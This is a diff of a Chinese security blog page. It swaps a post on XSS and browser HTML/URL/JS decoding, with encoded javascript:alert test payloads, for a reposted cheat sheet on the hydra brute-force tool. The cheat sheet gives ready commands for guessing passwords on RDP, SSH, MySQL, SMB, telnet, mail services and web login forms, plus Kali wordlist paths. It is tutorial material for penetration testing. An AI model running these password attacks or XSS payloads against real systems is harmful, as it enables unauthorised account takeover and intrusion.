@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Web安全,">
+  <meta name="keywords" content="m3lon">
 
 
 
@@ -79,18 +79,17 @@
 
 
 
-<meta name="description" content="今天看道哥的白帽子讲web安全中XSS的防御部分，不太明白，所以就查了相关的服务器编码与浏览器解码，做一下小总结吧。 参考：https://security.yirendai.com/news/share/26 这篇文章真是一场解惑的及时雨 浏览器解析过程  浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解">
-<meta name="keywords" content="Web安全">
+<meta name="description" content="转载：http://www.luxinzhi.com/safe/438.html Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MI">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss与浏览器编解码">
-<meta property="og:url" content="http://m3lon.github.io/2019/03/17/xss与浏览器编解码/index.html">
+<meta property="og:title" content="暴力破解工具-hydra命令总结">
+<meta property="og:url" content="http://m3lon.github.io/2019/03/23/暴力破解工具-hydra命令总结/index.html">
 <meta property="og:site_name" content="m3lon">
-<meta property="og:description" content="今天看道哥的白帽子讲web安全中XSS的防御部分，不太明白，所以就查了相关的服务器编码与浏览器解码，做一下小总结吧。 参考：https://security.yirendai.com/news/share/26 这篇文章真是一场解惑的及时雨 浏览器解析过程  浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解">
+<meta property="og:description" content="转载：http://www.luxinzhi.com/safe/438.html Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MI">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-17T06:37:49.157Z">
+<meta property="og:updated_time" content="2019-03-26T03:43:31.575Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xss与浏览器编解码">
-<meta name="twitter:description" content="今天看道哥的白帽子讲web安全中XSS的防御部分，不太明白，所以就查了相关的服务器编码与浏览器解码，做一下小总结吧。 参考：https://security.yirendai.com/news/share/26 这篇文章真是一场解惑的及时雨 浏览器解析过程  浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：HTML解析、JS解析和URL解析，每个解析器负责HTML文档中各自对应部分的解">
+<meta name="twitter:title" content="暴力破解工具-hydra命令总结">
+<meta name="twitter:description" content="转载：http://www.luxinzhi.com/safe/438.html Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MI">
 
 
 
@@ -120,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="http://m3lon.github.io/2019/03/17/xss与浏览器编解码/">
+  <link rel="canonical" href="http://m3lon.github.io/2019/03/23/暴力破解工具-hydra命令总结/">
 
 
 
 
 
-  <title>xss与浏览器编解码 | m3lon</title>
+  <title>暴力破解工具-hydra命令总结 | m3lon</title>
   
 
 
@@ -293,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/03/17/xss与浏览器编解码/">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/03/23/暴力破解工具-hydra命令总结/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="m3lon">
@@ -310,7 +309,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">xss与浏览器编解码</h1>
+          <h1 class="post-title" itemprop="name headline">暴力破解工具-hydra命令总结</h1>
         
 
         <div class="post-meta">
@@ -322,8 +321,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-17T13:26:03+08:00">
-                2019-03-17
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-23T15:20:40+08:00">
+                2019-03-23
               </time>
             
 
@@ -332,6 +331,28 @@
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/工具教程/" itemprop="url" rel="index">
+                    <span itemprop="name">工具教程</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -360,62 +381,31 @@
       
 
       
-        <p>今天看道哥的白帽子讲web安全中XSS的防御部分，不太明白，所以就查了相关的服务器编码与浏览器解码，做一下小总结吧。</p>
-<p>参考：<a href="https://security.yirendai.com/news/share/26" target="_blank" rel="noopener">https://security.yirendai.com/news/share/26</a> 这篇文章真是一场解惑的及时雨</p>
-<p><strong>浏览器解析过程</strong></p>
+        <p>转载：<a href="http://www.luxinzhi.com/safe/438.html" target="_blank" rel="noopener">http://www.luxinzhi.com/safe/438.html</a></p>
+<p>Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</p>
+<p>命令参数：</p>
+<p>-R：继续从上一次进度接着破解<br>-S：大写，采用SSL链接<br><strong>-s ：小写，可通过这个参数指定非默认端口</strong><br><strong>-l ：指定破解的用户，对特定用户破解</strong><br><strong>-L ：指定用户名字典</strong><br><strong>-p ：小写，指定密码破解，少用，一般是采用密码字典</strong><br><strong>-P ：大写，指定密码字典</strong><br>-e ：可选选项，n：空密码试探，s：使用指定用户和密码试探<br>-C ：使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>-M ：指定目标列表文件一行一条<br>-o ：指定结果输出文件<br><strong>-f：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</strong><br>-t ：同时运行的线程数，默认为16<br>-w ：设置最大超时的时间，单位秒，默认是30s<br>-v / -V：显示详细过程<br>-o 可导出文件<br>server：目标ip </p>
+<p>常用协议暴力破解参数格式：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">破解rdp(3389)：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l administrator -P password.txt -V IP rdp</span></span><br><span class="line">破解mysql：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra ip -L 用户名 -P pass.txt -V mysql</span></span><br><span class="line">破解ssh：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -L user.txt -P password.txt -e ns -vV IP ssh</span></span><br><span class="line">破解https：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -m /index.php -l muts -P pass.txt IP https</span></span><br><span class="line">破解teamspeak：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span></span><br><span class="line">破解cisco：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -P pass.txt IP cisco</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -m cloud -P pass.txt IP cisco-enable</span></span><br><span class="line">破解smb：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l administrator -P pass.txt IP smb</span></span><br><span class="line">破解pop3：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l muts -P pass.txt my.pop3.mail pop3</span></span><br><span class="line">破解http-proxy：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l admin -P pass.txt http-proxy://IP</span></span><br><span class="line">破解imap：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -L user.txt -p imap://ip PLAIN</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</span></span><br><span class="line">破解telnet</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</span></span><br></pre></td></tr></table></figure>
+<p>补充：</p>
+<p>post方式提交，破解web登录：该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。</p>
+<p>带参数破解如下：</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hydra -l admin -P <span class="keyword">pass</span>.lst -o ok.lst -t <span class="number">1</span> -f www.superl.org http-post-<span class="keyword">form</span> “<span class="built_in">index</span>.php:<span class="keyword">name</span>=^USER^&amp;pwd=^<span class="keyword">PASS</span>^:invalido”</span><br></pre></td></tr></table></figure>
+<p>说明：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t 是同时线程数为1，-f 是当破解了一个密码就停止，<a href="http://www.superl.org是网站域名，就是目标ip，http-post-form表示破解是采用http" target="_blank" rel="noopener">www.superl.org是网站域名，就是目标ip，http-post-form表示破解是采用http</a> 的post 方式提交的表单密码破解。后面参数是网页中对应的表单字段的name 属性，后面中的内容是表示错误猜解的返回信息提示，可以自定义。</p>
 <blockquote>
-<p>浏览器在解析HTML文档时无论按照什么顺序，主要有三个过程：<strong>HTML解析、JS解析和URL解析</strong>，每个解析器负责HTML文档中各自对应部分的解析工作。下面以一篇HTML文档解析来简单的讨论下解析器如何协同工作的。</p>
-<p>首先浏览器接收到一个HTML文档时，会触发<strong>HTML解析器</strong>对HTML文档进行<strong>词法解析</strong>，这一过程<strong>完成HTML解码并创建DOM树</strong>，接下来<strong>JavaScript解析器会介入对内联脚本进行解析</strong>，这一过程完成JS的解码工作，如果浏览器遇到需要URL的上下文环境，这时URL解析器也会介入完成URL的解码工作，URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析。</p>
-</blockquote>
-<p><strong>深入理解</strong></p>
-<p>下面我们结合具体示例来讨论下浏览器的解析原理过程和XSS复合编码的一些内容：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>针对上述a标签我们分析一下该环境中浏览器的解析顺序，首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为JavaScript，因此该环境中最后一步JavaScript解析器还会进行解码操作，最后解析的脚本被执行。</p>
-<p>整个解析顺序为3个环节：HTML解码— URL解码— JS解码</p>
-<p>我们对href值做一些编码的转换，对照刚才分析的解析过程，思考一下脚本是否会正常执行？</p>
-<p>Test1: 对<code>javascript:alert(1);</code> URL编码</p>
-<p>Test2: 对javascript html实体编码；对alert(2); url编码</p>
-<p>Test3: 三层复合编码</p>
 <ol>
-<li><p>JS编码：<code>&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;test3&lt;/a&gt;</code></p>
-</li>
-<li><p>URL编码：</p>
-<p><code>&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;test3&lt;/a&gt;</code></p>
-</li>
-<li><p>HTML编码：</p>
-<p><code>&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;&quot;&gt;test3&lt;/a&gt;</code></p>
-</li>
+<li>域名前面不需要加http:// When using hydra, it’s <strong>not required to put http://</strong> before the host that you’re going to attack.</li>
+<li>需指定端口，用-s参数  To <strong>specify the port</strong>, please use the <code>-s</code> flag.</li>
+<li>post请求，需要制定服务器目标文件地址如：In the POST request you have to <strong>specify the file that is going to receive the POST request</strong> (e.g. index.php, password.php, validate.php, etc.)</li>
+<li>最后需要指定正确或者错误情况下的输出信息 And last, but not least, you <strong>have to specify the Success case or the Fail case.</strong></li>
 </ol>
-<p>html在线测试：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29"</span>&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:%61%6C%65%72%74%28%32%29"</span>&gt;</span>test2 <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;"</span>&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>测试结果：test1无法弹窗；test2、test3成功弹框</p>
-<p><strong>思考：</strong></p>
-<p>Test1: HTML解码，URL解码为：javascript:alert(1); 然后js执行。emmm… 我是像上面这样想的，但是为什么执行的时候是404呢？这就涉及到URL解析中的一个细节，<strong>不能对协议进行编码，否则url解析器会认为它无类型</strong>，从而javascript没有被解码，自然就不会被执行了。于是404…</p>
-<p>Test2: HTML解码javascript；URL解码alert(1); JS解析完成执行操作</p>
-<p>Test3: HTML解码为编码第二步，继续HTML解码出javascript，URL解码，JS解码并执行</p>
-<p><strong>扩展：</strong></p>
-<p>场景分析：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onclick</span>=<span class="string">"&#123;$value&#125;"</span> &gt;</span></span><br></pre></td></tr></table></figure>
-<p>如果<code>$value</code>用户可控，如输入为alert(‘m3lon’);那么如果防御XSS？</p>
-<p>如果只进行html实体编码，那浏览器直接html解码—&gt; JS解码执行 肯定不可以的</p>
-<p>那如果加上一层JS编码呢？即JS编码—&gt;html编码</p>
-<p>浏览器解码顺序为：html解码—&gt;JS解码，按理说也会执行，但是实际上不会，为什么呢？</p>
-<p>​    这里有一个关键点：在js中，单引号，双引号和圆括号等属于控制字符，编码后将识别为文本字符（而不是控制字符）。所以对于防御来说，应该编码这些控制字符。下面这种方式可以解析。<br>  <code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</code></p>
-<p><strong>总结</strong>：</p>
-<p>文章一方面浅谈了html解析过程，深入的解析可以看下面第二个链接，时间有限，就先不深入研究了；另一方面重点描述了URL解码与JS解码中的两个关键点：</p>
-<ul>
-<li><p>url的协议名不可以被编码，否则url解码将视为无协议</p>
-</li>
-<li><p>JS自解码会将js中的控制字符如：单双引号、圆括号等识别为文本字符，只显示，不解析</p>
-</li>
-</ul>
-<p>参考：</p>
-<ul>
-<li><p><a href="https://security.yirendai.com/news/share/26" target="_blank" rel="noopener">https://security.yirendai.com/news/share/26</a> </p>
-</li>
-<li><p><a href="http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/" target="_blank" rel="noopener">棒棒哒</a></p>
-</li>
-</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l info@test.com -P rockyou.txt  -o ~/ok.lst -f site.test.lab -s 8080 http-post-form <span class="string">"/email/_task=login:_token=ON3n2HxDuhlMfViOmuB8fE2H5CGTd1aQ&amp;_task=login&amp;_action=login&amp;_timezone=Asia%2FShanghai&amp;_url=_task%3Dlogin&amp;_user=^USER^&amp;_pass=^PASS^:InvaildPassword"</span></span><br></pre></td></tr></table></figure>
+<p>其他：</p>
+<p>关于字典：在kali里，是默认自带了字典的，分别放在下面三个文件中：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/usr/</span>share/wordlist <span class="meta">#常用下面的rockyou.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wfuzz/</span>wordlist</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/usr/</span>share/seclists</span><br></pre></td></tr></table></figure>
+<p>或者利用kali自带的crunch生成字典。</p>
+<p>关于暴力破解的扩展：<a href="https://securixy.kz/hack-faq/brute-force-vstroennymi-sredstvami-kali-linux.html/" target="_blank" rel="noopener">https://securixy.kz/hack-faq/brute-force-vstroennymi-sredstvami-kali-linux.html/</a></p>
 
       
     </div>
@@ -455,12 +445,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
-          
-        </div>
-      
 
       
       
@@ -470,8 +454,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/04/反弹shell语句的理解/" rel="next" title="反弹shell语句的理解">
-                <i class="fa fa-chevron-left"></i> 反弹shell语句的理解
+              <a href="/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" rel="next" title="解决ubuntu crontab反弹shell失败的问题">
+                <i class="fa fa-chevron-left"></i> 解决ubuntu crontab反弹shell失败的问题
               </a>
             
           </div>
@@ -479,10 +463,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" rel="prev" title="解决ubuntu crontab反弹shell失败的问题">
-                解决ubuntu crontab反弹shell失败的问题 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
